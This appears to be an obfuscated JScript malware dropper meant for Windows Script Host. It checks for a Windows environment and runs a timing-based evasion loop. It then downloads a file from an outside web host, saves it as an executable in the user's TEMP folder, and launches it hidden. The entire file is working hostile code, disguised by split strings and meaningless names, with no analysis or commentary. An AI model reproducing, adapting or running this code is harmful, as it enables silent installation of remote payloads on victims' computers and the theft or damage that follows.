var G0 = false;
var P1 = "Create"+"Object";
var MO = function Z() {return WScript[P1]("WScript"+".Shell");}(), VT = 11;
var D = "MSXML2"+".XMLHTTP";
var O = 2;
var P0 = O - 2;
function HM(ZL){MO["Run"](ZL, P0, P0);};
function F(){return D + "";};
function W(Y, LQ){P0 = P0 * 1; return Y - LQ;};
function CT(){return P1;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var KI = "";
function GZ(){return 22;};
var AM = 0; var PD = 0;
function PN()
{
var JY = new this["Date"]();
var AZ = JY["getUTCMilliseconds"]();
WScript["Sleep"](GZ());
var JY = new this["Date"]();
var U = JY["getUTCMilliseconds"]();
WScript["Sleep"](GZ());
var JY = new this["Date"]();
var Q = JY["getUTCMilliseconds"]();
var AM = "SI";
AM = W(U, AZ);
var PD = "TH";
PD = W(Q, U);
KI = "open";
return W(AM, PD);
}
var GW = false;
var MX = false;
for (var KZ = P0; KZ < GZ() * 1; KZ++){if (PN() != P0){
GW = true; 
PD = "31" + 11 * AM + PD; 
MX = true; 
break;
}}
function A() {return ((GW == true) && (GW == MX)) ? 1 : P0;};
if (GW && A() && MX){
function N() {return MO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DdgPuT1Fxg.ex" + "e";};
 G2 = F();
 G1 = WScript[P1](G2);
 var L = 1;
do { 
	for (;L;){
	try {
		if (L == 1)
		{
			G1[KI]("GET", "http://pure-line.com.pl/f6splw", false);
			G1["send"]();
			A0 = "Sleep";
			L = 2;
		}
		WScript[A0](GZ() + 120); 
		if (G1["readystate"] < 2 * 2) continue;
		L = P0;
		function FK(W0) {var G = (1, 2, 3, 4, 5, W0); return G;};
		LW = WScript[CT()]("ADODB.Stream");
		G2 = LW;
		G2[KI]();
		G2["type"] = FK(1);
		G2["write"](G1["ResponseBody"]);
		LW["position"] = FK(P0);
		G2["Save" + "ToFile"](N(), 2);
		LW["cl"+"ose"]();
		P = N();
		HM(P);
	} catch(KL){};};
}while (L);
}
}

